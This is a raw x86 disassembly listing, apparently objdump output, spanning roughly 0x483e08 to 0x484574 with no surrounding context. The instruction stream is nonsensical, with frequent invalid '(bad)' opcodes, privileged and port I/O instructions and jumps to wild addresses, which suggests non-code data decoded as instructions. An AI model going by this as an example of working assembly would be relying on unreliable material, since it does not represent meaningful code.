  483e08:	ret    
  483e09:	jmp    0xffcbf927
  483e0e:	inc    edx
  483e0f:	fistp  QWORD PTR [edx+0x42e2b74d]
  483e15:	imul   edi,DWORD PTR [edx+0x2b],0x62
  483e19:	or     eax,0xfba9723
  483e1e:	ds inc esp
  483e20:	inc    ecx
  483e21:	addr16 push ebx
  483e23:	mov    eax,ds:0x3da831f
  483e28:	inc    ebp
  483e29:	xlat   BYTE PTR ds:[ebx]
  483e2a:	inc    ebp
  483e2b:	pushf  
  483e2c:	jae    0xa016e98f
  483e32:	inc    esi
  483e33:	addr16 ds loope 0x483e54
  483e37:	pop    edi
  483e38:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  483e3a:	aaa    
  483e3b:	push   edx
  483e3c:	shl    ecx,1
  483e3e:	loope  0x483e4a
  483e40:	daa    
  483e41:	outs   dx,DWORD PTR ds:[esi]
  483e42:	(bad)  
  483e43:	push   0xffffffa4
  483e45:	ret    0xcb77
  483e48:	inc    esi
  483e49:	push   0x23
  483e4b:	xor    bh,bh
  483e4d:	jbe    0x483eab
  483e4f:	ficomp DWORD PTR ds:0x42223af7
  483e55:	ss push edi
  483e57:	mov    bh,BYTE PTR [esi]
  483e59:	lock loopne 0x483ec2
  483e5c:	iret   
  483e5d:	aaa    
  483e5e:	iret   
  483e5f:	daa    
  483e60:	add    BYTE PTR [ebx+0x5786c787],al
  483e66:	jbe    0x483de9
  483e68:	rol    DWORD PTR [edx],0xe1
  483e6b:	pop    ds
  483e6c:	scas   eax,DWORD PTR es:[edi]
  483e6d:	mov    dh,0xde
  483e6f:	jmp    0xc82b9771
  483e74:	xor    ebx,ebx
  483e76:	pop    edx
  483e77:	jg     0x3f37d1ed
  483e7d:	sysexit 
  483e7f:	scas   eax,DWORD PTR es:[edi]
  483e80:	mov    edi,0x4e8ee27c
  483e85:	scas   al,BYTE PTR es:[edi]
  483e86:	scas   eax,DWORD PTR es:[edi]
  483e87:	out    0xfb,al
  483e89:	pop    es
  483e8a:	js     0x483eac
  483e8c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  483e8e:	scas   eax,DWORD PTR es:[edi]
  483e8f:	test   DWORD PTR [ecx],0xfb1f84d2
  483e95:	inc    esi
  483e96:	outs   dx,DWORD PTR ds:[esi]
  483e97:	imul   edi,eax,0x2e
  483e9a:	push   edx
  483e9b:	mov    esp,0x7fb33746
  483ea0:	sub    eax,DWORD PTR [ebx-0x7c]
  483ea3:	add    DWORD PTR [edi+0x78],0x67
  483ea7:	push   edi
  483ea8:	xor    eax,DWORD PTR [edi+0xb]
  483eab:	pushf  
  483eac:	retf   
  483ead:	sti    
  483eae:	mov    bl,0x38
  483eb0:	cmp    al,BYTE PTR [esi+0x34]
  483eb3:	or     edi,DWORD PTR [edx-0x3d]
  483eb6:	jo     0x483e3d
  483eb8:	idiv   DWORD PTR [edi+0x37]
  483ebb:	imul   eax,eax,0xffffffbb
  483ebe:	xchg   DWORD PTR [ebx+0x6e737e0f],esi
  483ec4:	pop    edi
  483ec5:	setne  BYTE PTR [edx]
  483ec8:	mov    esp,0x6b6736f3
  483ecd:	inc    esp
  483ece:	out    dx,al
  483ecf:	sbb    edx,DWORD PTR [esi]
  483ed1:	pop    es
  483ed2:	(bad)  
  483ed3:	mov    edi,0x16e0f22f
  483ed8:	or     al,0x8e
  483eda:	add    ebx,DWORD PTR [esi]
  483edc:	out    dx,eax
  483edd:	faddp  st(5),st
  483edf:	add    ebp,DWORD PTR [ebp-0x46]
  483ee2:	shl    DWORD PTR ds:0x3f44577b,cl
  483ee8:	aam    0x46
  483eea:	cmp    al,0xd0
  483eec:	inc    ebx
  483eed:	xor    al,0x3
  483eef:	jge    0x483ed1
  483ef1:	add    bl,BYTE PTR [edi]
  483ef3:	mov    ds:0x3b4997a7,eax
  483ef8:	pop    esi
  483ef9:	loope  0x483f4a
  483efb:	(bad)  [ecx]
  483efd:	sar    DWORD PTR ds:0xefac5bc4,cl
  483f03:	adc    dl,bl
  483f05:	mov    esi,DWORD PTR [ecx]
  483f07:	mov    al,0xe1
  483f09:	adc    dl,BYTE PTR [edi]
  483f0b:	iret   
  483f0c:	inc    edx
  483f0d:	dec    ebx
  483f0e:	mov    ds:0x9f08efbd,eax
  483f13:	pop    es
  483f14:	xor    al,0x7f
  483f16:	xchg   ebx,eax
  483f17:	xor    eax,0x67c3d3cf
  483f1c:	ret    0x7def
  483f1f:	inc    ebp
  483f20:	lahf   
  483f21:	repz push ss
  483f23:	retf   
  483f24:	loopne 0x483f89
  483f26:	mov    bh,0xf3
  483f28:	jae    0x483fa2
  483f2a:	pop    ds
  483f2b:	lahf   
  483f2c:	sahf   
  483f2d:	xlat   BYTE PTR ds:[ebx]
  483f2e:	addr16 inc esp
  483f30:	inc    edi
  483f31:	xchg   edi,ebx
  483f33:	pop    edx
  483f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  483f35:	dec    ecx
  483f36:	out    0x96,eax
  483f38:	stos   DWORD PTR es:[edi],eax
  483f39:	push   edi
  483f3a:	(bad)  [edx+0x3b329357]
  483f40:	pop    edx
  483f41:	retf   
  483f42:	inc    esi
  483f43:	sbb    DWORD PTR [ebp-0x71],0x45
  483f47:	xchg   ebx,eax
  483f48:	(bad)  
  483f49:	ret    
  483f4a:	xor    edx,edi
  483f4c:	mov    edx,0x4f078177
  483f51:	out    dx,al
  483f52:	dec    edi
  483f53:	or     esi,eax
  483f55:	sbb    DWORD PTR [edi],0x43c73517
  483f5b:	mov    ?,WORD PTR [esi]
  483f5d:	loope  0x483f7a
  483f5f:	and    ebp,edi
  483f61:	cmp    DWORD PTR [edx+0x41],edi
  483f64:	inc    ebp
  483f65:	pop    eax
  483f66:	pop    es
  483f67:	dec    esi
  483f68:	xor    al,0x5f
  483f6a:	daa    
  483f6b:	jge    0x483fcf
  483f6d:	ror    DWORD PTR [ebx-0x8ecc6ad],cl
  483f73:	sbb    al,0x1e
  483f75:	test   DWORD PTR [edi-0x11],eax
  483f78:	mov    bl,0x43
  483f7a:	inc    edi
  483f7b:	cli    
  483f7c:	cmp    cl,ah
  483f7e:	loop   0x483fae
  483f80:	lahf   
  483f81:	mov    ecx,DWORD PTR [ebx-0x29]
  483f84:	jnp    0x483ff7
  483f86:	jb     0x483ffb
  483f88:	inc    esp
  483f89:	pop    es
  483f8a:	scas   al,BYTE PTR es:[edi]
  483f8b:	inc    ebp
  483f8c:	cmp    esi,ebx
  483f8e:	adc    DWORD PTR [esi],eax
  483f90:	or     esp,ebx
  483f92:	xor    eax,0x9e1370a
  483f97:	pop    ss
  483f98:	fisttp QWORD PTR [esi]
  483f9a:	xlat   BYTE PTR ds:[ebx]
  483f9b:	xor    al,0xdb
  483f9d:	and    ebp,DWORD PTR [eax+ebx*1]
  483fa0:	lods   eax,DWORD PTR ds:[esi]
  483fa1:	psrad  mm7,QWORD PTR [edi]
  483fa4:	jle    0x483fc2
  483fa6:	loopne 0x483fbb
  483fa8:	push   edi
  483fa9:	xchg   edi,eax
  483faa:	imul   esp,DWORD PTR [ebx-0x42],0x70
  483fae:	mov    edx,0xa6ffda1a
  483fb3:	mov    edi,0xf1ea6785
  483fb8:	dec    edi
  483fb9:	inc    esi
  483fba:	pop    ebx
  483fbb:	dec    edi
  483fbc:	jl     0x48401a
  483fbe:	icebp  
  483fbf:	aas    
  483fc0:	xchg   edi,eax
  483fc1:	inc    esp
  483fc2:	jmp    0x483f77
  483fc4:	fnsave [eax+0x6ec785da]
  483fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  483fcb:	ss pop eax
  483fcd:	lds    edi,FWORD PTR ds:0x7a63ffe9
  483fd3:	pop    ss
  483fd4:	shr    BYTE PTR [edx+0x474675db],0x42
  483fdb:	fistp  DWORD PTR [edi+0x7]
  483fde:	dec    edi
  483fdf:	cmp    BYTE PTR [ebx+0x47],ah
  483fe2:	out    0xb3,eax
  483fe4:	loopne 0x483fe8
  483fe6:	out    dx,eax
  483fe7:	jge    0x483fb8
  483fe9:	xor    DWORD PTR [ebx],edi
  483feb:	mul    DWORD PTR [edi-0x73]
  483fee:	mov    al,0xea
  483ff0:	loopne 0x484049
  483ff2:	das    
  483ff3:	ret    
  483ff4:	into   
  483ff5:	clc    
  483ff6:	clc    
  483ff7:	or     DWORD PTR [edi],0xf30c767
  483ffd:	sbb    BYTE PTR [eax+edx*2],bl
  484000:	push   edi
  484001:	pop    es
  484002:	orps   xmm5,XMMWORD PTR [ebx-0x6f]
  484006:	data16 jl 0x484000
  484009:	xor    ch,BYTE PTR [edi-0x4588baf5]
  48400f:	jp     0x48404b
  484011:	shl    bl,0xeb
  484014:	rol    DWORD PTR [edi],cl
  484016:	stos   DWORD PTR es:[edi],eax
  484017:	lods   al,BYTE PTR ds:[si]
  484019:	(bad)  
  48401a:	iret   
  48401b:	push   esi
  48401c:	xchg   DWORD PTR [edx],edx
  48401e:	aas    
  48401f:	icebp  
  484020:	push   es
  484021:	add    dh,BYTE PTR [ebx]
  484023:	out    0x44,eax
  484025:	icebp  
  484026:	in     eax,0xf0
  484028:	mov    cl,0x77
  48402a:	xlat   BYTE PTR ds:[ebx]
  48402b:	push   ebx
  48402c:	(bad)  
  48402e:	xor    DWORD PTR [esi-0x23],esi
  484031:	aas    
  484032:	xor    eax,0xc331ab53
  484037:	xor    bh,0x71
  48403a:	retf   
  48403b:	mov    edi,0x37670767
  484040:	mov    eax,0x873fc038
  484045:	ret    0xde4f
  484048:	push   0xab33de93
  48404d:	arpl   WORD PTR [edx-0x2d],sp
  484050:	call   0x335c360
  484055:	xchg   edi,eax
  484056:	mov    dh,0xbb
  484058:	daa    
  484059:	ficomp WORD PTR [eax+edi*4-0x19]
  48405d:	xor    ebp,ebx
  48405f:	xor    edx,DWORD PTR [edi]
  484061:	cmp    esp,DWORD PTR [esi]
  484063:	(bad)  
  484065:	rcl    DWORD PTR [ebx],1
  484067:	aas    
  484068:	sahf   
  484069:	pop    ss
  48406a:	popa   
  48406b:	or     eax,0x383ade58
  484070:	dec    edi
  484071:	add    eax,0x7be054bc
  484076:	imul   edi
  484078:	add    BYTE PTR ds:0x6fff741e,0xe
  48407f:	dec    ebx
  484080:	mov    ?,eax
  484082:	outs   dx,BYTE PTR ds:[esi]
  484083:	cmp    esi,DWORD PTR [ebx]
  484085:	sbb    ecx,DWORD PTR [esi-0x35]
  484088:	xchg   edi,ebx
  48408a:	push   ecx
  48408b:	fsub   QWORD PTR [ecx]
  48408d:	test   DWORD PTR [esi],0x4127380b
  484093:	cmp    edi,DWORD PTR [edx+0x22ef6c38]
  484099:	adc    esp,edi
  48409b:	dec    ebx
  48409c:	push   cs
  48409d:	mov    al,0xa2
  48409f:	(bad)  
  4840a0:	(bad)  
  4840a1:	daa    
  4840a2:	(bad)  
  4840a3:	daa    
  4840a4:	movsx  esi,ax
  4840a7:	ret    
  4840a8:	jae    0x4840e3
  4840aa:	fidiv  DWORD PTR [edi]
  4840ac:	inc    ebp
  4840ad:	add    eax,0xbb0f7838
  4840b2:	xchg   edi,eax
  4840b3:	jnp    0x484090
  4840b5:	mov    eax,0x33bc580f
  4840ba:	iret   
  4840bb:	aaa    
  4840bc:	ds scas eax,DWORD PTR es:[edi]
  4840be:	out    dx,eax
  4840bf:	dec    ecx
  4840c0:	(bad)  
  4840c1:	xlat   BYTE PTR ds:[ebx]
  4840c2:	packuswb mm0,QWORD PTR [ebx-0x36]
  4840c6:	in     eax,0xf8
  4840c8:	add    BYTE PTR [esi+0x4887ff38],dl
  4840ce:	ret    
  4840cf:	mov    edi,0xf1fffd6
  4840d5:	push   cs
  4840d6:	mov    al,0xa4
  4840d8:	add    DWORD PTR [esi+0x22390f43],ebp
  4840de:	(bad)  
  4840e0:	adc    ecx,ebx
  4840e2:	lahf   
  4840e3:	push   ds
  4840e4:	inc    ebp
  4840e5:	test   DWORD PTR [eax],edi
  4840e7:	mov    DWORD PTR [ecx],esp
  4840e9:	cmp    BYTE PTR [edi-0x12a76450],ch
  4840ef:	xor    ecx,DWORD PTR [edi]
  4840f1:	jg     0x4840c5
  4840f3:	mov    al,ds:0x6f8b3e02
  4840f8:	mov    ds:0x4fad1b06,eax
  4840fd:	call   DWORD PTR [edi]
  484100:	or     DWORD PTR [ebx],0x3f447639
  484106:	cmp    BYTE PTR [ecx-0x22],al
  484109:	fcmovb st,st(3)
  48410b:	mov    edx,0x5a3fe36f
  484110:	inc    edx
  484111:	(bad)  
  484112:	inc    esi
  484113:	dec    eax
  484114:	dec    esp
  484115:	mov    bh,0x3f
  484117:	sbb    BYTE PTR [edx+ebp*8+0x14],ch
  48411b:	(bad)  
  48411d:	aas    
  48411e:	xchg   ebx,eax
  48411f:	mov    ebx,DWORD PTR [ebp+0x7b]
  484122:	xor    edi,DWORD PTR [edi-0x6abcc0c9]
  484128:	sub    eax,0x45ab6986
  48412d:	jg     0x484122
  48412f:	ret    
  484130:	lds    ebp,FWORD PTR [esi]
  484132:	cmc    
  484133:	jg     0x484174
  484135:	mov    edi,0xc28f0f37
  48413a:	or     al,BYTE PTR [esi]
  48413c:	push   edi
  48413e:	mov    cl,0x8b
  484140:	dec    ebx
  484141:	ins    BYTE PTR es:[edi],dx
  484142:	lahf   
  484143:	mov    ds:0xd7d8bf5b,eax
  484148:	sub    BYTE PTR [ebx+ebx*1+0x7f],0x13
  48414d:	mov    edi,0x98a0c7b1
  484152:	xor    DWORD PTR [edi-0x22],ebp
  484155:	jg     0x4841b2
  484157:	pusha  
  484158:	jo     0x4841c3
  48415a:	inc    DWORD PTR [esi]
  48415c:	push   DWORD PTR [esi]
  48415e:	shr    BYTE PTR [eax+0x58],1
  484161:	mov    edi,0x29463fe2
  484166:	fdiv   DWORD PTR [eax-0x47c1d041]
  48416c:	pop    edx
  48416d:	ret    
  48416e:	lds    edi,FWORD PTR [edi]
  484170:	inc    ebx
  484171:	aas    
  484172:	jae    0x4841ca
  484174:	xor    cl,al
  484176:	and    bh,BYTE PTR [edi-0x1ff8b9e1]
  48417c:	jmp    0x4841ab
  48417e:	ret    
  48417f:	jg     0x4841c2
  484181:	pop    edi
  484182:	mov    bh,0xa8
  484184:	add    ebp,DWORD PTR [eax+ebp*8+0x6bff538f]
  48418b:	mov    cl,0x6f
  48418d:	push   edx
  48418e:	inc    esi
  48418f:	xor    DWORD PTR [ebx-0x4e8f00bd],ebx
  484195:	inc    ecx
  484196:	ds jg  0x4841cd
  484199:	inc    edx
  48419a:	inc    DWORD PTR [ecx+0x56]
  48419d:	fisttp DWORD PTR [edx]
  48419f:	(bad)  
  4841a0:	jg     0x4841a9
  4841a2:	call   DWORD PTR [edi]
  4841a4:	xchg   al,ch
  4841a6:	push   0x5
  4841a8:	jg     0x4841ed
  4841aa:	aas    
  4841ab:	inc    ecx
  4841ac:	cs stc 
  4841ae:	pop    esi
  4841af:	dec    ebx
  4841b0:	xchg   BYTE PTR [edi+0x17d84135],bh
  4841b6:	xchg   esi,eax
  4841b7:	pop    esp
  4841b8:	inc    ebx
  4841b9:	and    edi,DWORD PTR [edi+0x4b]
  4841bc:	shl    edx,1
  4841be:	cwde   
  4841bf:	inc    ebx
  4841c0:	aas    
  4841c1:	daa    
  4841c2:	daa    
  4841c3:	sbb    al,0xb0
  4841c5:	arpl   cx,ax
  4841c7:	dec    DWORD PTR [edi+0x70c1c9ba]
  4841cd:	xor    DWORD PTR [edi],edi
  4841cf:	xor    edi,edi
  4841d1:	xor    eax,0x6cc9bc0b
  4841d6:	aas    
  4841d7:	xor    al,0xbf
  4841d9:	adc    al,BYTE PTR [ebp+0x3f62e283]
  4841df:	aaa    
  4841e0:	mov    edi,0x96935b46
  4841e5:	or     bh,bh
  4841e7:	scas   al,BYTE PTR es:[edi]
  4841e8:	inc    edx
  4841e9:	aad    0x25
  4841eb:	jae    0x48419a
  4841ed:	(bad)  
  4841ee:	aas    
  4841ef:	cmp    DWORD PTR [edx-0x9],eax
  4841f2:	xor    al,0x2c
  4841f4:	ficom  DWORD PTR [esi]
  4841f6:	aas    
  4841f7:	jg     0x4841f8
  4841f9:	mov    eax,0x46cb6990
  4841fe:	aas    
  4841ff:	cmp    BYTE PTR [edx],dh
  484201:	ins    BYTE PTR es:[edi],dx
  484202:	or     BYTE PTR [ebx+ebp*1],bl
  484205:	mov    edi,0xc00feb1f
  48420a:	bound  eax,QWORD PTR [edi]
  48420c:	ds mov edi,0x9696687f
  484212:	nop
  484213:	ss mov edi,0xbc21413f
  484219:	add    al,0xab
  48421b:	aas    
  48421c:	jg     0x484251
  48421e:	scas   al,BYTE PTR es:[edi]
  48421f:	or     DWORD PTR [ebx+0x53],ebp
  484222:	out    dx,eax
  484223:	inc    esi
  484224:	aas    
  484225:	outs   dx,DWORD PTR ds:[esi]
  484226:	xor    DWORD PTR [eax-0x68],esp
  484229:	sub    BYTE PTR ss:[edi],cl
  48422c:	jg     0x484263
  48422e:	aas    
  48422f:	dec    esp
  484230:	push   es
  484231:	mov    dh,0xc0
  484233:	xchg   esi,eax
  484234:	aas    
  484235:	inc    ebx
  484236:	sbb    al,0x8b
  484238:	frstor [eax]
  48423a:	das    
  48423b:	aaa    
  48423c:	aas    
  48423d:	mov    edi,0x321c1175
  484242:	xor    esi,DWORD PTR [ecx]
  484244:	jg     0x48427e
  484246:	push   ebp
  484247:	mov    ch,0x86
  484249:	lds    edi,FWORD PTR [edi]
  48424b:	mov    edi,0x608992bf
  484250:	test   DWORD PTR [edx-0x3651cdc1],esp
  484256:	rcr    esi,0x53
  484259:	aas    
  48425a:	inc    ebx
  48425b:	imul   ebp,DWORD PTR [edx+0x1c],0x2c
  48425f:	mov    dh,0x3f
  484261:	xor    esi,DWORD PTR [edi-0x65dc6d40]
  484267:	xor    edi,DWORD PTR [edi-0x4f8d8ac8]
  48426d:	arpl   di,di
  48426f:	cmp    DWORD PTR [edi],edi
  484271:	inc    ebx
  484272:	inc    ebx
  484273:	and    eax,0x62
  484276:	(bad)  
  484277:	inc    DWORD PTR [edx+0x3f]
  48427a:	inc    ebp
  48427b:	jg     0x48428e
  48427d:	xlat   BYTE PTR ds:[ebx]
  48427e:	sub    eax,0x12bf4586
  484283:	aas    
  484284:	pop    ebx
  484285:	lds    ebp,FWORD PTR [edx-0x3040804e]
  48428b:	aas    
  48428c:	inc    eax
  48428d:	mov    ds,WORD PTR [ebp-0x3b]
  484290:	mov    edi,0x32343f32
  484295:	push   0xffffffc1
  484297:	in     al,0x38
  484299:	sub    ebx,edi
  48429b:	ins    BYTE PTR es:[edi],dx
  48429c:	jne    0x48427b
  48429e:	(bad)  
  48429f:	jg     0x4842d4
  4842a1:	cmp    DWORD PTR [edi],edi
  4842a3:	call   FWORD PTR [ebx+ebx*2+0x30]
  4842a7:	fdiv   DWORD PTR [esi]
  4842a9:	out    dx,eax
  4842aa:	fistp  QWORD PTR [edi+0x521e0837]
  4842b0:	and    BYTE PTR [edi+0x18ed7f0f],cl
  4842b6:	add    edi,DWORD PTR [ecx-0x4900d8c8]
  4842bc:	mov    cs,WORD PTR [ebx+0x1f45bf60]
  4842c2:	jg     0x48433a
  4842c4:	mov    ah,0x83
  4842c6:	pusha  
  4842c7:	xor    edi,DWORD PTR [edi+0x32]
  4842ca:	push   DWORD PTR [edi+edi*1]
  4842cd:	ret    
  4842ce:	sub    al,0x14
  4842d0:	sub    al,0xbf
  4842d2:	pop    ds
  4842d3:	cmp    bh,cl
  4842d5:	pop    eax
  4842d6:	inc    ecx
  4842d7:	mov    ds:0xadbfbf58,al
  4842dc:	stos   BYTE PTR es:[edi],al
  4842dd:	test   eax,0xef34af1a
  4842e2:	(bad)
  4842e5:	lods   al,BYTE PTR ds:[esi]
  4842e6:	jg     0x4842cb
  4842e8:	xor    edi,edi
  4842ea:	inc    edx
  4842eb:	(bad)  
  4842ec:	pusha  
  4842ed:	inc    edi
  4842ee:	xor    ch,BYTE PTR [ebx-0x41]
  4842f1:	mov    edx,0x7a93aa26
  4842f6:	push   DWORD PTR [ecx]
  4842f8:	aas    
  4842f9:	dec    eax
  4842fa:	rcr    DWORD PTR [edx],1
  4842fc:	mov    al,0xbf
  4842fe:	mov    edi,0xd7822d34
  484303:	ja     0x484349
  484305:	jg     0x484346
  484307:	cs inc esp
  484309:	or     ebx,0x3e3f4537
  48430f:	test   DWORD PTR [ebx+0x32231ae9],esp
  484315:	aas    
  484316:	cmp    BYTE PTR [eax-0x13],ch
  484319:	mov    esp,edx
  48431b:	jg     0x48433b
  48431d:	jg     0x484377
  48431f:	mov    ebx,0x8b3fb6d6
  484324:	repz aas 
  484326:	pop    eax
  484327:	sti    
  484328:	sbb    BYTE PTR [ebp-0x41],cl
  48432b:	lahf   
  48432c:	aas    
  48432d:	fdiv   DWORD PTR [eax-0x74]
  484330:	push   eax
  484331:	fistp  QWORD PTR [edi+0x37]
  484334:	jg     0x4843a3
  484336:	ret    
  484337:	sbb    dh,BYTE PTR [ecx+0x163f8f8f]
  48433d:	mov    ebx,0x3f0a6e98
  484342:	inc    edx
  484343:	jg     0x4842f6
  484345:	fdiv   DWORD PTR [ebx]
  484347:	(bad)  
  484348:	aas    
  484349:	iret   
  48434a:	jg     0x4842d2
  48434c:	daa    
  48434d:	push   es
  48434e:	add    eax,0x223fde63
  484353:	mov    eax,0x3f3926b8
  484358:	cmp    DWORD PTR [edi-0x74],edi
  48435b:	in     al,0x86
  48435d:	fnstenv [ebx-0x5cbc40c9]
  484363:	pusha  
  484364:	add    esi,DWORD PTR [esi-0x1]
  484367:	(bad)  
  484368:	aas    
  484369:	les    ebx,FWORD PTR [esi]
  48436b:	(bad)  
  48436c:	xor    BYTE PTR [esi],0x3f
  48436f:	mov    ebx,0xd756cd7f
  484374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  484375:	mov    edi,0x30323f3f
  48437a:	ins    DWORD PTR es:[edi],dx
  48437b:	jb     0x48438d
  48437d:	inc    DWORD PTR [ebx-0x41]
  484380:	xor    bh,BYTE PTR [edx]
  484382:	push   esi
  484383:	nop
  484384:	mov    BYTE PTR [edi+0xb4eff7f],bh
  48438a:	mov    ecx,0x363f36e2
  48438f:	(bad)  
  484390:	push   0x7f1710ba
  484395:	sub    edx,DWORD PTR ds:[edi]
  484398:	jb     0x484406
  48439a:	ror    DWORD PTR [edi],0x3f
  48439d:	cmp    BYTE PTR [ecx],dh
  48439f:	cmp    BYTE PTR [esi+0x237f1c5b],bl
  4843a5:	sbb    edi,DWORD PTR [edi]
  4843a7:	mov    cl,BYTE PTR [ebx-0x54]
  4843aa:	lea    edi,[edi]
  4843ac:	mov    edi,0xa42ae17
  4843b1:	mov    al,0xbf
  4843b3:	out    dx,eax
  4843b4:	xor    eax,0x9ad99726
  4843b9:	aas    
  4843ba:	aas    
  4843bb:	inc    ebx
  4843bc:	inc    ebp
  4843bd:	sbb    eax,0x7637b130
  4843c2:	aas    
  4843c3:	inc    ebp
  4843c4:	jg     0x4843ff
  4843c6:	dec    ebx
  4843c7:	push   cs
  4843c8:	cs and eax,0xe246ae3e
  4843ce:	mov    edx,0x7f4f12b0
  4843d3:	aaa    
  4843d4:	add    al,0x78
  4843d6:	and    edi,DWORD PTR [ecx-0x40cf41]
  4843dc:	jne    0x48444a
  4843de:	mov    ebx,DWORD PTR [ebp+0x46]
  4843e1:	push   ebx
  4843e3:	call   FWORD PTR [edi+0x9]
  4843e6:	cmp    eax,ebx
  4843e8:	inc    ebp
  4843e9:	aas    
  4843ea:	inc    ebx
  4843eb:	ds xor al,0x76
  4843ee:	ins    DWORD PTR es:[edi],dx
  4843ef:	sbb    esp,DWORD PTR [edi+ebx*4]
  4843f2:	push   DWORD PTR [ebx]
  4843f4:	jg     0x484410
  4843f6:	imul   ebp,DWORD PTR [edi],0xd
  4843f9:	ss aas 
  4843fb:	fidiv  WORD PTR [esi-0x20805ef0]
  484401:	aas    
  484402:	jecxz  0x48440e
  484404:	and    eax,0xbfff0896
  484409:	xlat   BYTE PTR ds:[ebx]
  48440a:	icebp  
  48440b:	push   ss
  48440c:	ret    
  48440d:	ss mov edi,0xd80d9b7f
  484413:	xlat   BYTE PTR es:[ebx]
  484415:	mov    edi,0xd8bf3f39
  48441a:	(bad)  
  48441b:	(bad)  
  48441c:	or     bl,BYTE PTR [esi]
  48441e:	push   DWORD PTR [edx]
  484420:	aas    
  484421:	adc    DWORD PTR [ebx-0x41804f3c],esp
  484427:	jle    0x484453
  484429:	inc    ebp
  48442a:	mov    DWORD PTR [edi-0x6fbae401],ecx
  484430:	outs   dx,BYTE PTR ds:[esi]
  484431:	leave  
  484432:	sar    edi,0x45
  484435:	aas    
  484436:	inc    ebx
  484437:	push   es
  484438:	ins    DWORD PTR es:[edi],dx
  484439:	inc    edi
  48443a:	mov    ebx,0x2f467f38
  48443f:	mov    edi,0x8c42c2cd
  484444:	out    0x1f,eax
  484446:	or     eax,0x7f5b63e4
  48444b:	(bad)  
  48444c:	cmp    DWORD PTR [ebp+0x19],ebx
  48444f:	(bad)  
  484450:	push   esi
  484451:	pop    ds
  484452:	aas    
  484453:	jae    0x4844c0
  484455:	inc    esp
  484456:	pop    edx
  484457:	in     al,dx
  484458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484459:	jmp    0x1c8b:0xc0ab3f3f
  484460:	cmp    BYTE PTR [edi],bh
  484462:	jmp    FWORD PTR [edi-0x6f]
  484465:	pop    ebx
  484466:	pop    ebp
  484467:	aas    
  484468:	aas    
  484469:	aas    
  48446a:	jmp    0x48440e
  48446c:	dec    esp
  48446d:	mov    edx,DWORD PTR [edx]
  48446f:	aas    
  484470:	push   edi
  484471:	aas    
  484472:	sub    al,0x2a
  484475:	sar    BYTE PTR [edi+0x35],0x7f
  484479:	jmp    0x397f:0x42ec5c9a
  484480:	aas    
  484481:	adc    DWORD PTR [esp+ebp*8+0x5c],ebx
  484485:	aas    
  484486:	or     bh,BYTE PTR [edi+0x34]
  484489:	aas    
  48448a:	pop    edx
  48448b:	or     eax,0xcb3f6f07
  484490:	aas    
  484491:	sub    al,0xe4
  484493:	and    bl,0x1f
  484496:	xor    eax,0xe00a367f
  48449b:	sub    BYTE PTR [esi+0x1f],dl
  48449e:	sub    esi,DWORD PTR [edx]
  4844a0:	dec    edi
  4844a1:	shl    DWORD PTR [ecx-0x25],1
  4844a4:	xchg   ebp,eax
  4844a5:	pop    ss
  4844a6:	aas    
  4844a7:	xor    edi,DWORD PTR [edi+0x5a]
  4844aa:	or     al,0x57
  4844ac:	shl    DWORD PTR ds:0x6eff453f,cl
  4844b2:	xor    al,0x63
  4844b4:	add    al,0x2f
  4844b6:	(bad)  
  4844b7:	aas    
  4844b8:	mov    eax,ds:0x4390b005
  4844bd:	ret    0x392e
  4844c0:	fadd   st,st(1)
  4844c2:	fild   WORD PTR [ecx-0x41]
  4844c5:	xor    dh,BYTE PTR [esi+ecx*1]
  4844c8:	jbe    0x4844eb
  4844ca:	(bad)  
  4844cb:	aas    
  4844cc:	inc    edx
  4844cd:	aaa    
  4844ce:	aas    
  4844cf:	inc    ebx
  4844d0:	loop   0x4844fa
  4844d2:	cmp    BYTE PTR [esi+ebp*1+0x3f],cl
  4844d6:	xor    al,0x75
  4844d8:	pop    ebp
  4844d9:	and    dh,BYTE PTR [ebp-0x41]
  4844dc:	pop    ds
  4844dd:	aas    
  4844de:	ins    DWORD PTR es:[edi],dx
  4844df:	jnp    0x48448c
  4844e1:	sub    bh,BYTE PTR [edi]
  4844e3:	jg     0x484544
  4844e5:	or     esp,DWORD PTR [edx+0x3fa176b7]
  4844eb:	aas    
  4844ec:	mov    ds:0xc5bafc7f,eax
  4844f1:	push   es
  4844f2:	inc    esp
  4844f3:	jmp    DWORD PTR [edx-0x1]
  4844f6:	xor    al,0x98
  4844f8:	call   0xff7cdacf
  4844fd:	xor    al,0x2e
  4844ff:	in     al,0x6d
  484501:	imul   edi,DWORD PTR [edi+0x3541be3f],0xffffffbb
  484508:	fadd   st,st(1)
  48450a:	call   0xf0eb:0x363f0f3f
  484511:	pop    eax
  484512:	add    al,0x7
  484514:	inc    esp
  484515:	mov    edi,0x2686937f
  48451a:	sub    al,0x7
  48451c:	aas    
  48451d:	xor    edi,edi
  48451f:	mov    bh,0x90
  484521:	and    ebx,DWORD PTR [eax-0x41]
  484524:	xor    BYTE PTR [edi],ch
  484526:	adc    al,BYTE PTR [ecx-0x66]
  484529:	test   bh,bl
  48452b:	aas    
  48452c:	outs   dx,DWORD PTR ds:[esi]
  48452d:	jne    0x48450b
  48452f:	daa    
  484530:	pop    es
  484531:	outs   dx,BYTE PTR ds:[esi]
  484532:	aas    
  484533:	aas    
  484534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  484535:	mov    ch,0xa1
  484537:	sbb    edi,DWORD PTR [edi+0x6c4bff44]
  48453d:	lods   eax,DWORD PTR ds:[esi]
  48453e:	sar    DWORD PTR [edi-0x4accc0fe],1
  484544:	or     BYTE PTR [esi],dl
  484546:	popa   
  484547:	jg     0x4845c8
  484549:	cmp    edx,DWORD PTR [edx]
  48454b:	pop    ebx
  48454c:	pop    ebx
  48454d:	pop    edi
  48454e:	stos   DWORD PTR es:[edi],eax
  48454f:	mov    edi,0x55b0713f
  484554:	dec    eax
  484555:	mov    edi,0x5b5c343f
  48455a:	xchg   ebp,eax
  48455b:	test   al,0x7f
  48455d:	pop    edi
  48455e:	(bad)  
  48455f:	cmp    BYTE PTR [eax+0x3f9623d8],bl
  484565:	mov    edi,0x92966439
  48456a:	into   
  48456b:	mov    edi,0xed41ff43
  484570:	add    al,0x52
  484572:	xlat   BYTE PTR ds:[ebx]
  484573:	aas    
  484574:	or     edi,DWORD PTR [ebp+esi*1+0x5bbfad6f]
